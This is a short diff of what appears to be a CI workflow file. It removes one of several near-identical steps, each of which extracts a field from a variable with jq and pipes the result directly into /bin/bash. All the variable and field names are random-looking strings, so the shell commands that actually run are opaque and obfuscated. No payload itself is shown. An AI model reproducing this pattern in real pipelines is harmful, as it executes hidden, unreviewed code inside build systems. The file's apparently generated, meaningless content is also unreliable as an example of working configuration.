@@ -26,7 +26,6 @@ jobs:
           echo $i71 | jq -r .sp69 | /bin/bash
           echo $rf25617 | jq -r .k3 | /bin/bash
           printf '%s' "$prbj129" | jq -r .gpsrm6 | /bin/bash
-          echo $s4 | jq -r .t14473 | /bin/bash
           printf '%s' "$ghq93502" | jq -r .die996 | /bin/bash
           printf '%s' "$ij8" | jq -r .ljcq133 | /bin/bash
           echo $k79 | jq -r .ufoum8 | /bin/bash
